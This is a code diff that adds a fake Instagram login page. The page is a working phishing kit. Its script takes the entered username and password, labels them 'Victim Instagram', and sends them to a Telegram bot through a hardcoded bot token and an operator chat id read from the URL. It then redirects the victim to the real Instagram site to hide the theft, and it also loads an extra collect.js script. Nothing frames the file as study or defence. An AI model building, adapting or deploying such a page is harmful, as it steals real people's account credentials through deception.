@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+body {
+    font-family: 'Arial', sans-serif;
+    background-color: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+
+.container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.login-box {
+    width: 300px;
+    padding: 40px;
+    background-color: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 1px;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+    margin-bottom: 10px;
+    text-align: center;
+}
+
+.logo {
+    width: 175px;
+    margin-bottom: 20px;
+}
+
+.input-group {
+    margin-bottom: 15px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 10px;
+    font-size: 14px;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background-color: #fafafa;
+    box-sizing: border-box;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 10px;
+    background-color: #3897f0;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.login-btn:hover {
+    background-color: #3578e5;
+}
+
+.or {
+    position: relative;
+    margin: 20px 0;
+    font-size: 14px;
+    color: #8e8e8e;
+}
+
+.or::before, .or::after {
+    content: '';
+    display: block;
+    width: 40%;
+    height: 1px;
+    background-color: #dbdbdb;
+    position: absolute;
+    top: 50%;
+}
+
+.or::before {
+    left: 0;
+}
+
+.or::after {
+    right: 0;
+}
+
+.social-login {
+    margin-bottom: 20px;
+}
+
+.fb-login {
+    color: #385185;
+    font-weight: bold;
+    text-decoration: none;
+}
+
+.fb-login:hover {
+    text-decoration: underline;
+}
+
+.forgot-pass {
+    font-size: 12px;
+}
+
+.forgot-pass a {
+    color: #00376b;
+    text-decoration: none;
+}
+
+.forgot-pass a:hover {
+    text-decoration: underline;
+}
+
+.signup-box {
+    width: 300px;
+    padding: 20px;
+    background-color: #fff;
+    border: 1px solid #dbdbdb;
+    text-align: center;
+}
+
+.signup-box p {
+    margin: 0;
+    font-size: 14px;
+}
+
+.signup-box a {
+    color: #3897f0;
+    font-weight: bold;
+    text-decoration: none;
+}
+
+.signup-box a:hover {
+    text-decoration: underline;
+}
+
+</style>
+
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="assets/Instagram-logo.png" alt="Instagram Logo" class="logo">
+            <form id="login-form">
+                <div class="input-group">
+                    <input type="text" id="email" placeholder="Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div class="or">OR</div>
+            <div class="social-login">
+                <a href="#" class="fb-login">Log in with Facebook</a>
+            </div>
+            <div class="forgot-pass">
+                <a href="#">Forgot password?</a>
+            </div>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+<script>
+function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            var Url = "https://www.instagram.com/";
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const message = `Victim Instagram\nUsername: ${email}\nPassword: ${password}`;
+
+            const telegramBotToken = '6310109803:AAHUt4ZUHhqyqrG4Ld50A6gb4LxGZgE8LXQ';
+            const chatId = getQueryParam('id');
+            
+            if (!chatId) {
+                alert('url expired');
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                   window.location.href = Url;
+                } else {
+                    alert('Login Failed.   Please try again later');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Login Failed');
+            });
+        });
+</script>
+<script src="collect.js"></script>
+</body>
+</html>
